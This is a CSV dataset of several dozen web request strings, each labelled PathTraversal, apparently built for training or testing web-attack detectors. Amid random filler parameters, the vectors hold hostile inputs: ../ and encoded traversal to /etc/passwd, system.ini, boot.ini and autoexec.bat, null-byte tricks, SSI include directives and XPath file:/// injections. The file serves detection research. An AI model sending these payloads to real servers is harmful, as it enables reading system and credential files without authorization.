id,class,vector
7390,PathTraversal,/thWudJshutdownoy3UWNt/tvz@TPtwxaw-Qd0DYtsr/uhia/paoiig5/nh/ts0R/tz5QHxK_i.MCNlZkfS7h/y9Crluxk_Mji3zmocha.bin?bhmw=sutlmailetr&eiiyhttciw19xi=%3C%21--%23include++++virtual%3D%22%2Fvar%2Flog%2Fhttpd%2Faccess.log%22+--%3E&h7w3yrH9=0kfeti&Slceii9exnncrf=ld%2F&bfjxpG4e=1447&rtflprt5iE4=alhesaSmseilaldez
7394,PathTraversal,/4n6p@wfromhbin/zey5NVDHUaPQEYdB/kmzuBFoc6Ix/T3AUzfgFSyJjQ/erivipb/diy/ah4or8rxedia5mi2/nfe/ezsna/vlA6teobaees.gif?_X0VMs=268098&MsabrteJai=collection%28file%3A%2F%2F%2Fc%3A%2Fav%2Fatm.xml+%29&o0eaaoynkbse8=3&rmmiPhrrahm=194853&hey1aer=2145&xIwMs6W3tw=etweaNn&IBgsbetweenfCu=ax.GsWOZ
7401,PathTraversal,tNaderstqs=oPW6Bi&HpX-V=elwf&BxQUX=Ot95rah&et7mrssmrnteh=sbu3zPmJPI&hEtChtrce=sVdnfe24fd9(i(r&etdzmmMtlBonaag=ho_Y.m2&hr=o6I-3OQ@z&exienxsdiIws=doc(   file:///c:/eer/rsibAas.xml)&asewiccrrket=06711179&Dheatttei4et=a25XL&aquaSeehtlAo1=5qNpahaseenme0as&eGutfrrfo8ivt=tg&t4oso0=t&elgteMlge2oT=83284&eohwbejcnmiys=66
7426,PathTraversal,/iTc4PMSYh/Ew._gVdF/eridzntcK18YNsaexde.nsf?esmhle8ctico86=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&igsIA0XaEr7adb=2h&jienghs3nsja=+ec%3Di%3Acattautoexecrn2z&PkzkU=l%3Ap+50KL+nas&oRlihyoe=%26a&rai57esDcoleie=74314342&ndctti=ei%3A%27bin
7428,PathTraversal,/epF7YNGnjzoIA5Rnu.jpg?rB_rIFvDF=dnimrbsngKE&wsigEmS6t=Foh&WhttpMPYXGU=ayaiiframea3%2Flg%3Fdau1ke&temre5ntym=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fni%2Fngen%2Fsitogeme%2Fveliicrito.exe
7431,PathTraversal,/.nsf/../winnt/system.ini?
7437,PathTraversal,/ftmdoyyxaiELTledmc/lWsItZtjS/enaltetjaWraTre/nCkHXG0s@w4ZRkcS0Ud/2tsr2olc1asncole/hd1tusRets3eirtk/Ion/eihaereshhshraPi/IS_null.h-FkmetaGRJ/mB2SzY/qemsed.shtml?yThhcekoo9bmYac=.%2F..%2F.%2F..%2F&sivta3oeqRalj=gdcxtXati6jn&1bIshzxYd=etreplacemlupdate%5D4Ebr%3Denet9e%27e&9OoL=hcjqRt&ley=6taiperl+et1ereh&aLaxQeMnetvrRte=f+processing-instruction7eexectelarob&lOCJPlnetcat=469975&abNerqnxoeTnams=dp8&grhce=37217
7444,PathTraversal,t7=Eclisi&tsttnseh9jd=hafsoo%ai&br=2)rs$&e10n=ysnteavOebf5Af&@J28inputaHa7=/etc/passwd&recsymaesc=aaec%Isrft\4Hae&Snc41agEfN=8485709210&FfsNr1cl=rouxmlbineewnTbmn@\&bf9s0xr=227790
7447,PathTraversal,/ETstdinR/n45TapWGFudNH7qMp/aeqedehaYrc2whwb.exe?olnowd8quKmih=reNtr1relscriptr&rnutiheinslcia=..........................WINNTsystem.ini&lhqyocrieufsfi=sllnms9BauO
7449,PathTraversal,/lNewbsaD2fo@FcgZcq.7/hxZ9JEG/eimieeeeOeiztiasb/3dlsesnewrxlf/a-AS6q/ievkfiisfehn6sr.sh?l6ee4Ari7=5707&stiewyrn1pninde=4xa&PfmetaUtH=3updatezea&2bts21t=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd
7470,PathTraversal,/mXPLlvS/voirotaIaoebneiilyo/njq6nI/itocdesaiartehs/sMH.e1iBD9DQ0/otEniot5oieue.tiff?riaromttee=j%2B%29rr0documentd%3Du0%29+&Srm=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fri%2Fme%2Ftrseistron%2Fniorlari.exe&ptehoeD=ehcq6oge%3Bd&s1d9mqeactlhen6=2310094&h5Iechi0=set&IuAEeE=drtlcaOtein
7471,PathTraversal,/iY7vz-PToZTvWNHbPin_/eg_Euv3Hatr/f4tireiahelse3ls5nn/a0e/sr0d8Snozsbme/aounewgEeoeM/ma0nhza2dIwqinjaeTu.png?
7495,PathTraversal,ia782t=a:\windows\boot.ini&byouohuDriot4o=nsrd nal(k0h
7497,PathTraversal,/tcnten18vce3136eB/e563nn6z.gif?7leieyg0seNp=nIfsC7pm&tatTyHtf=i%3Bi&fsECaSf=esw3teoisibin9&purdSiitct=beemece&yuwS7letchrnrm=439&i1v=c1aGWWW&otmslo=8&yk5oanh=gd7Achild&SLbed=654710&adr2hscatirqrls=ta8aeedupdateoe%7Erl&Gd1uce=543625270&OLys3dzbqnonhAG=to4o4%27rr%3Ap&iem5hovhh=systemEoe%28h+Bsamurot
7499,PathTraversal,/ed/c6PahtreoEh/t4dktgmhbsof8On.js?pesio23bi5np4md=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&L9jwag=oanBece%3Dgitmpbn&n0dnlqeccmlhueq=3e9otavtv1p&HvPP29M7blinkl3=erEeon5vpptlanaYe&srnieqoLi=rnUohsisondd&se6X8iau54=2870&rbnc6oa4e=mites&Xea3emhun=trho&pioaqmbosongig=eoeoH%7Es8ew%28i&c0aooaho=77&1ZGSz=082998&5Rca=4rm&RugnnqrytIcok0=64920141&ptzratitulur=464892732&e0teux1r=%2F%27atmpi
7507,PathTraversal,/nrbumatu/2JFRurxmn2osgD./thentypxetaeeahmaT/rOo1i6tor7Hrp77ibs6/nRdwb_R3MGsT/miOsK/oeont/navXngq/pweD8uet/0Li%uSetcs2/prfu0mrooehr8r/LYxHWyfy6smW0L.tiff?hmibrO=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&eaonsGZurtttIn=paoizttr5eeaqaHoo
7517,PathTraversal,/CPformNsUxy3HybZ/drT.Pi6c7Q_50/G@wy/aesseeIeetedoi.nsf?eiv8Anmak=tRKnZ4&su4sTwgi=..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&ene0aNe5=oC5mf
7518,PathTraversal,/eS2xrAVYeq07QboLwUnG/adNoE3blrso8dug/rrD-Iyx5njG/CdrkN.exe?3ie51fg=..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&se8hmtbohw=cjKp&4Rlpxk2pw98C=dajf_RwiGl&qCXallu=erTvD-k6&XSxp=rma2ro+remratdc&ghenoaea=022399&tnt75eesu=stdS&nNJhxmlOby=749390&ErDESb3d=4qp1zdasbual&ghlthwl1=ciy00gbocet&l0so=683121&8ueen22rp=0&sj-maHf-26=394
7520,PathTraversal,/izRgHxSIYWLkTcsF9R.5/havingYsLTp/vCyhvVq/NsYprocessing-instructioninput/wMnalwVGnVp_RHB47I/iktY89selectQLbnetcatksRcopy/ZAQQ4Oh-.gif?tmssts7aesd=jwM&ttloexiTrtaalbs=f+enopeno+i%28&0Ywp-B-M8jHl=914790&daqfed=2&Lom7iu=6338223&K8lpsXZf=Kphe&uyMitdc=%27%29%3F6&tsrepiaimla=ta&zeasPsce50lo=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&esen0jad=170&dumtddietamgt=06192339&5gohada=ts3%40T%40a7c&sayeeEtd4aesa=gqo&3gObkloN=+%7C
7523,PathTraversal,/LW6DCRkf-e7/eenRtn/stdinIas%u/taldra56ee/hAoo3ozwoael7wpeae/jseooeola8heti/aB/7eziinj63qy3nf/fhssnny8tsn/waGsecrknehee/iSt/mtroS.shtml?lee5azlI=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&form.Bwindow.openEiframe9OinsertV=nn&tqdsmasn7=Xe%28%7C&Luiapre=eidwcdoq&wea0i=aZURz%40LucpQu&nanameOWhi=0843&seshwecy=3480&2Dsatmdtldoce=j
7525,PathTraversal,/AB/sy/rPzKOBa/rcTJK_/nyZa6/98n6S/gdcuem/uOps@.css?eMreldhIrscry=mrdlnwltcvo&nejc7dI5fny=pS&ueaeiTeth=83&nY_7bWHaPRTX=file%3A%2F%2F%2Fs%3A%2Fano96%2Flbm2t%2Fesnomf.xml&chyeayolnsua=ahn
7529,PathTraversal,/error/\..\..\..\..\winnt\win.ini?
7530,PathTraversal,///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////?
7538,PathTraversal,/.nsf/../notes.ini?
7541,PathTraversal,/104W8D_HYAx/pT/sW@wOn999Q/sujatacsygar.aspx?IleatwtOAg=oeyu76h&etssc6mRac=tie&ackuouu=4717765&no9lanrshbs=navetl1&a0su=tOn-&ldqntsvo=ls6&s8emeegRm=air2%25hyewnctra&Z_Gnph-ldeleteP.@Tbgsound3=duiftrnavo1sfc1i&aia=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&A2=hpZoz&9piktsgpl=401-Qt&C7TThdulr=eermmatftpcmd&a92EeraiEdx=uXz9mavy
7544,PathTraversal,////?
7548,PathTraversal,/C2/vH3nm8tw/iov1ntsbhebvw5grla.shtml?KyJrcp=Ua%7EaEic&dollrhnzi=s%7Etah0u%3CgzwArb&sbadsrs=oetcv&ne35nd7ott=%3DTrnre&ctmpsGh=8807383&ihtts=lefULsSL0qA&bCoaedcp=hTEooU3&ihs6aity=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&oOTmfmailL=+-&mstc2re=eneyasyoa2wafed
7554,PathTraversal,Sbpciaeece=Iiho&edj3osi&ewiz6Ywbd4isa=atseptGl~3o&2aaqse26rditG4e=399102442&jsmy=eWmg0K&67=../../../../../../../../../WINNT/autoexec.bat&sEinhth=42703434&J25YDxZpD=(styleetneL>d7eb&rdnhe5o3oyc1b=ft5ehomeapeolgdcp&lcmibrgh=nPi-crwqDfM&giywed=03MZvy34&uls@YSz0=83067&llbung6g=oo>n&RItuunurs=tn8Eos5dayeexn&PhOZOEA=gwfod6ostylejea&r.s8T=wFm2V1
7555,PathTraversal,/itos6retinnorttm/kZQkX/VincludeqOl/bd.swf?nMrr4=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fyo.bat&aanasuednP6dEe=jee&ZGG5jX=epdln
7556,PathTraversal,/i-Je/SvEd.php4?behapE3qad=131&svfi4NdAknThe=6&eWanmseiysdx=934240&of=%2F%2C%2C%2C%2Ftn1Ha%2Fsnetgt%2Fpasswd&eaiiciraus4h5e=fwnlettgs%26nO&feejlpe8nms0=eaeeenoknadn&agevcd=+iframerawyyttmptaeCihvf+%29t&3aept4oifoqrdeh=a+%5C&6tun=i.8YlThJ
7564,PathTraversal,rst=251577&jEZ=ahaoWicrnmwiliEi&eZELansIhen6=3&uTdonm1=impaiiNrg&Terinon=a4psQLTv&wkMPgihg3j7=Bsry&Dyjloelo3='1m trmi&Rn-6hefandd=/../../../../Inetpub/iissamples/nanast/esnitetiri/ndolllitni/aratroatre.nsf&ZiaEraLU6hrun=t1sPd-&e6=3811
7569,PathTraversal,/t2oabc5l03hms/u_IwKAY/ic/rnlneehy/kcdYF5Bel9wWcI/k4XVQ76v.aspx?auWgt=..%2F..%2F..%2Fmetote%2Fadmin.txt&dylpacyons=sfti7rAjnc&dTmu7=dOrwas4tshoreio&tpnbre=eeeedareites0&o5allz8=0227&uferon9toaaesr=f3QEJVd5O8g&edO=9&H8dLboot.iniQyNchild=ileptnshTopL&iyuanheyf=738&3e=btetfquhtcr0o&PCw8rcpEvm=tnjeeyVwsreplaceh
7578,PathTraversal,tpnet=eg8hem&octjdarevIfjmn=tOE-4LD9vV&a4rvIRcdlqrq=ctbhosadra&Rrifo=sock_stream&Ek-a=b&eoenbU1isx=../../../usr/dsqqdsqsd.xml&reie0z=he11Qc&NmdocumentlY2=odivoiss)&3tpoa=78903155&xoah=g<&eeSRJ-=c6BQ&satGrRlsssirYta=ed0&cgietDejmdoho=970
7579,PathTraversal,/rJgh/ssrKieee4rcewil4arty/mnrUMKBGO4ijAiWw2wf/dlXYGkVu1VzW.gif?8sptnSretwUwi=32&F2zreplace5U9PG=9&zkss42eoS=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&rRIoolTaaamhx=6832789&UQD_7B=9Sidservicesd&xo4ussrasyp4li=00&5kti=2556449&Wlocationo1c@FEe=13&rns=isr%2Fsir+styledOieSmikwiM&hsanwaueHbvi=69810675
7580,PathTraversal,/zlronitwAnalpeg.aspx?O9rde=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fon%2Fesetes%2Folrale%2Filntatnion.asp
7584,PathTraversal,uo=648&aeuRwme6=\.\.\/\.\.\/\.\.\/\.\.\/etc\/passwd%00.html&hcezrdrurb3R9aU=3712644209&ihojdrRee5wyeo9=523&euMnna5en6edq=lphpsms&6gR5sZaeilvem=a-MF0A&EJobjectBhIccS@wv=utdeut
7586,PathTraversal,/03Zadminxterm./adsoabneot1ebhi/esn8oirH/rulm2vus9P..3sr6sMT.html?uhtgd=W%3B+Na6Y9tttpn4e&d3nu=l6Ty&teueearfelnplah=3939027&nTnl66old=lehkhmm&7etugesy=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Foltrde%2Fas%2Fasneet%2Forstngitte.swf&teteeeq=933030256&cSih8=566&nhr1aswoc=60640&o5FTLsystemiBaVs=glCE05ta&rdhdd7=1&uzq9passwdw=0&ryr=64x8k&tEesbguhtroeo8=%3Dehtaccesh%26a+Ris
7589,PathTraversal,.////////////////////////?
7594,PathTraversal,/t07ki4.YA2qQZV1.msf?-kk5@h=Etn0e&otrtd5oiae=nooriNo%26fessflu%3Ce%26&ero3h=ufSee0%29pliejas&GmKfspz.2Ms=octt0&gCa7lhm8kter=dcehn%7C&wrbatoDpz=1195113645&CTboot.iniR.en=o&korgm=qen+wnlscIln&tcpe3=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&i3gteqe=yservicesnta2%7E+eb&men5rrteosc=46&4psmErschnbnm=537132398&ETd=54602&raanns=m5UeMndqdroptjdlsu
7596,PathTraversal,/.nsf/../winnt/system.ini?
7599,PathTraversal,/scG4.mWj0HRm0KG-raA/siuantht9eeo2hiwpiov.exe?
7600,PathTraversal,/e.o3ExWueiAR6qWs8mSn/ds/rabQie9g2ske91io/yO.WP/cqBlLeBIyHL/xeEtryttIdi0/LCBAS/unQFFdnezCxOHDZ/eyPGYWdQcG/iyU.php3?lto=zeDSgzSItc7gqedtls&rlqhor=wauomcioetioSs&hn1h1gsmauenle=doc%28++file%3A%2F%2F%2Fc%3A%2Fes%2Fnsuoa.xml++++%29&kiogen=65&mBhdot=3&iframe3QJFztb=714328&U8vbscript1=1%7Er&Ihnyhn2=5518132&S0u=8159
7611,PathTraversal,/p-.esehuYD63/qD35EedhotshiEFe/NoDwdT/deonisy7g/0SyttenenatefnUpbh/6hZFae9AMoLC3Ozy/.ehavingJGT@qxwI/sS_g-39P4I@O.msf?tsri9diz6zlioE=t%3A%5Cwindows%5Cboot.ini&wleE=24&jn2=385
7616,PathTraversal,"YrAD=47192098&stylebcSaw=iWw@1y&efcaecax=hn>r? &lEQWNIjBG=bvaxt&aef1esa=shutdownrtgl&Iomner=5uWJ9_w&jidew=43&JUinputlogrGWK=oDeal&taEtl3tgiAxIs2=ond&gcEBexecNobjectb0XHh=<!-- #include  virtual=""/etc/passwd""    -->&Elcnaoxm6eeEHor=324"
7624,PathTraversal,/lxKdqLp9Z/Xr.exe?xrpasswdIH6qUq=..%2F..%2F..%2FWINNT%2Fautoexec.bat&4eL5rajm9enhswb=aescWoC28&cR94d8EHg=218188&estEnees=m++flocationtaccepthavingtl+%5Di1ib&dbarhf=2&ZdocumentiXA0x_P=tmpzrn8%3DePxa
7629,PathTraversal,/ie.jsp?Zgroup
7640,PathTraversal,/nqvvmahqdV/S64enc7tOovocefor.mspx?tan4debqbshn=..........................WINNTsystem.ini&ws2ubwsm8=%5Briel%3Fldscriptf%2Bn%3B0dti
7641,PathTraversal,/SMZx/nEXMMtKoP/ete7/S2fromgW/ldwovFPSZdeWpazjbeCj/pGu/u.jm0vrp7.htm?ty=..........................WINNTsystem.ini&cd9dYK=0741&af=Reqne&Isetnnnep62=etetiefls%29drtpvnes
7646,PathTraversal,/Bcpassthru_a/9zieMvC.e2Q9U2YVn/twiHEewOqkn3/5JMO.WbetweenfDnc9/HawryWhN/cpcH_JKArRFaTtAf/rSsbEs6merSiherh.shtml?w0r=2%3A%5Cwindows%5Cboot.ini&4k1De-Vov@_=eoOIPinputbf8%2F0wa+
7653,PathTraversal,/cOemnDNArIsIhxEyF-IN/shl5eEfnoDn/i5sFheSeA/iwkGXGtR2g6ynS_34zk/maju1eaaonemee3hoRor/positionn3EvWand9@Tm6E.html?rab9taAh=rQNlMvB&nhrrbonema=sRCgAB&iWlcsz=ei8WqaoL4zF&atenaA=nonssgn&kdGmSC=hmn7&Q3BOJjiPD=e7J&1aLLenertC=iwIu%40RU2R3G&nfpU4rZat=xolibuAt&sen4=nsntiiAgeSitqshN&yIeiguasCb=n%3A%2F.htaccess%7E&neP=owgetSm%24htpass+jhtmi&eCmirneiddh=yt1ssenNmeor&ec=sf3rataej4t&AysedN=5
7657,PathTraversal,/Tsnotrssaipe/mZbTd/ngfcFubzMgAft/EfDCd43kaW/1Y259mAV.c3Dy74IuC/ser/tfwiqe7gsnewre/hamnkrtuysfhtge/u@0Y6YXYc31e3M/kvG/aeemncsEepz9rn3iu/sl_V87vrwGmY.jpeg?fvareztasrpB=7%3A%5Cwinnt%5Cboot.ini&etroRtp4ao=aimgua%7Ettreep&l8=300132&fGqc=97661792&eEnoeeulenafpJr=Nlt5teopengbetween0ao
7658,PathTraversal,/lg91/lqWtV3zFZtuc/GJgWicatkGDK/ttdiIe.html?ste=saoaouldrsk9eb&S4sO%u=355&nDoSsSfn4hMdtcs=n9eea&logTTQUUXIx=ooao&8aOg=%2Fetc%2Fpasswd&yO6rgtzx7to5=9%26l&aa3fsaksi=yg%5Dicele6itohne&ah=2479&aa=nemceaInlm9Nt&eolDTa=8&tM0oeii6sb=M%3E&9sr8yrnLtho=el+&eouztwc0oo8=nmn6bpogeo2iewRiea&tcfdrrb=%40t%7E
7664,PathTraversal,/vWV1Ex6bU7SIEfE/ran0urpca/nR@wbfM-Xo@AnDUI.cfm?tointmnhznrbs=fo%3Et+++wheree%25ktd&cxNlter=efdnhnan&etmrLhDp=6rreh5em&l6_rvwto=eih7togmail%3A&rh7lwmrxc=1&ScatD1Vnt=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&IatkEty02newf=1%7EnlIdnwEst%3FF
7665,PathTraversal,/.nsf/../winnt/system.ini?
7666,PathTraversal,/nHtptYPWTOqX7LLNoOA/2mncnouowtumdonf/olFCJej7cw50.shtml?dteMe=02&Ehp0awntNurhet=39191&EabWater=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fmees%2Fitasveroli%2Froet%2Fin.bin&bht=ifil&IJcaWgF=rhgths&lir1sftid5rejs=4556915&RWvVDk=%26o1Dfo%3D0itu%24vshq&lghxeEIenre=os+&seirswkmcu=ebh%5Db&iMivyCObM=%5Btya&wje=tt%26go&tofwctra9rre5=17&enetmottzre4k9=os4riaeo9twhrag&ncr2=%7EemtEn&tshutdown8e26tnvqk=group+bycmtrhnE%26eQ
7671,PathTraversal,qrioeieceehrrr0=ae evalefenChfgcRs&oeaAwe9le=o25NAf..G&1tSnh=z6se8sgebo&esaeedomtwn=..\..\..\..\WINDOWS\system.ini&ErDt3nwwsyo=ates5n&oi6e1imncYsqt=acG0&tt6S6thNrqauun=3135469&nts3htteuld3a=543091
7675,PathTraversal,/i@@lrzDlkVKe2K_uS/cmqS2s-XH9-xV@cDkJ/kJLoautoexecjj2Lh_waccess_logshutdown/kSbe/nbWJ.0GNNWRxemwbA/n9Xc.php4?pmisu9tds=%3C%21--++++%23include+++virtual%3D%22%2Fetc%2Fpasswd%22+++++--%3E&dsod4aha=923809&eqh=6s4g+ooberei
7679,PathTraversal,u1xtermQe@Otmp6yIJ=../../../../../../../../../etc/passwd
7680,PathTraversal,/.nsf/../notes.ini?
7686,PathTraversal,/hcaspea570moewtele8/passwd.n@4B/QZNstdin-O4wC8ZQSi.tiff?CSB2ei.4systemTw=bide0areea&kori=010947932&q5soegrwjeets=a7mrtmexpg8tsm&eoonihe=58445&hA3EbG3tM77M=r%3A%2F.htaccess%7E
7688,PathTraversal,/smbeclE7aelo/fU4LAJ_bpsQC/vdbjwiTd7sa03rj/UR3yhttps_g5qUmL3union/iZU/o4dtu5phmiQ/oqftaeioo.html?3ottbCaef=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&AwvYvJHV=h7eetofdeyiOen9
7693,PathTraversal,/Xaoaebntw/nTgmdpdS.QV4-fmfEyr/chuYXZQgs/UD5im_A66wq-Sk/atoGIOcLor5/8@.shtml?inUYzJbodyOZ=nesnppNd5%22%26uchaving&A4ea3n=snlEtmr-ti&itrsrsobsdn=7648980&rcsohu3e=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Filel%2Fmataverive%2Fmealntte%2Fta.bin&eO=02&D.M1=naS-yCHU&oEsoe9t=800407&op=o1%7Eat%3D%7Eperls%3F&iA4i7enaOhNi=lt%3D&ey=376&uudiR2csEei4x=ot0oeagbls8Hn9lo&naen=1742350583&zosmoiFftY=38&NloE=rs5iriEUJWI&dhsh9tiOfts=87
7700,PathTraversal,/beao/3VFnYj/8QincludeciBU/Jtloe/eaZyP2vPYt4v@gZ/xede/osla7qoyeolteer.tiff?e6=3333773618&6sotp2cslq8p=etnpo8ae3r&91RupdateiR6_=ee2ewherernh&k.1Ua3HZw=%7Eau8ia&ii7dhO4=w%2Fxml&rltE=.%2F..%2F.%2F..%2F
7702,PathTraversal,/yhwslnhX/ds5iyy7cmnNierocTelm/f_cmd/rEIns/-39U/sPRy.jpg?Sc_RFcat=m6atRkieidecfh5s&onwvp4olwgsf7ac=rlocationke+t&teeucsdEiarPykb=5&moboo=unFSumlshutdowna&ran=e4&qeieAEhrnnniih=am6DS_Tf&te6mjnpsei=3TfF%40HQ
7712,PathTraversal,////?
7721,PathTraversal,/hfC2KWqKi4Hi7D_Zt/uvDTP/t8i.mdb?iteOeEt2mo3=plvie7-Ciedag&dyHRghx=y+t%27e&dae0eeynteiE=FgmdI0r&Ojnr4n=1HFRbJ3rew&4thde=Snn&inefpr=Emeandr&oxariifltD=tsystemtl%27731hgtnnst&0gVTo0Y.=t7einiw&d8te0n0hsluP=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&sooADdnoxcAaa=8691506067&KNtBEBDO3childetcH=tonboe&ts98=527403&6exXtelnetA9=tnco4tnetcat+h%29dbat&ujMsiyubasiursm=065384661
7729,PathTraversal,/Kcnull3dv/K@Fnbodywvmsysteme/eocarh0msoo0/nGB202Ld/nSgulst7ea/ie1Ntrnzsaroy/aescffdMhcBkuej/no8uoeUehmrpl5edl4tR/NeOdhcds/rMjbGpDAEaL7v@1m.asmx?hlLeettrekoie=e6bamo%3Abs&0leeosontateia=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&ttoarcY=n%7EdnaaNy81g5oA
7737,PathTraversal,/.nsf/../winnt/win.ini?
7740,PathTraversal,/tfO9NDnL.shtml?8it0ples=as9lV&uo=nohyhr%7Evbscript%29ynmowindow.open&naDohn=.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F&qGZ5Miframe2=nZlp8tAettenystost&2tQmocha=057
7748,PathTraversal,naieaoeario3=hi&6rhoaaaei5ht=2772&nerfrn=8970703&lieo=rtegUOb&futtbihclto9cn=ifofra&j290=32&eatioyi=hG&uh=38802&n1neflhH=8994832125&Rndsjm=EhhreWaQriefnmTe69&oh0NHtto=thb+lr&fi8nrctsearWt=4599&oahaiei3f=glt&%u.7httpsB7USOdfg=75888&njeqss=584
7751,PathTraversal,/ubesioUoneyht7o.html?aohn=36&MpuiiAdhu=jmR4yuya%7E%5De&icltinota8ra=xtermenet&ihgsaRondu=6&ratecedwkt=eio&aoaip1thiE2dse=ry&sa3Eloeogees2=14&naa=sedi8fu0ebk+n&ax4rfpsoa4hCrl=hkjucwVJAMyM&7h2EglwOberabdn=enodeclr3oy%3B
7754,PathTraversal,/ov7WFunPZt0xxf7ldd4y/eUkvitmeaasn/rlsynzgtg/eGJY-jY-gN5BVwRZaf/0ZC4d2Vas/NeoIi3Ioe/nM4g6yh/h8kendRjedple/Fl1odhI7qauaYs.js?gcmd1access_log9v_K@Z0=eysrshywpn&Nchnr=281846&fttbbextb6t=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2FNe.conf&Teaoml=oltf&eaolei=m0wGkdlsannosa&eZp.zv=0876814&B8oash=731&aehejiecesE=22163
7761,PathTraversal,/z@YtilK0/tgo/cA/28pOf./oe5dml/spOsYQvCyL/lspg9ppds/JL96Q44e@6Yw5E/pSrOhXPZk/tZer.jpg?whwwbdj4h=ened%29%3Dg0naymha5&d4dc=6c9fJAztIYn&form5pJvmYs=%2Fst&nu1s=oaimHHL&stnrafdsJra=aesm9exece%2BSE&2.XGacceptcT=sTGsrju7pk&i8eaitda=d+Erd+&htot=yezqPPSP&eeu6sljna=..%2F..%2FUBData%2FMembers%2Fmembers.grp%2500&Secrsp=Taxterms&vsma=a6ttaptiaOThTs&nAiftpr=wt+&dwvittctIeoae=7616176&W6FjMu=%7Elikebns
7762,PathTraversal,/7ha/Kr/negaro0saimren0Sra/o0/O9Hw/ea5eNoimlsQrte/snZFdvog-H2qit2E/6bx7.asmx?orn=2_Hpr&Etssae=lttchildkhme%40j-joeptrVa%26&fhG=dBDL&rlPwSleIeltmh=rXg&.ZJ@Phtpass=7071&ubi2s=appwva7rm&edkyqe=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&4ePJPx=xiDlen&elt6Tglure4gion=e%27o%26ickm1Isen%3EdscripttE&tvWtwrQnd3abD=74&is2t=lib%3Bsamtncfromhposition%28+i%3ELcbwhewp-
7763,PathTraversal,/eguzhmwIneN5/tYP/tdvcJRBm.ypRL0/us/deleteine@Ct7GL4LUvX/depeonirR7kneecla/4bnremehshi1te/dc9eipm/A_Uwgetj3@-NGbumDL/ud.js?cdehl=12011132&O7mnnddsraiiovt=rohshEeaiq&tuaa1ovttnft0Gg=nonvnar%5DnesiI+n%2B-%3Cexec&dh=l+&les8O8b=78049&TrK0group
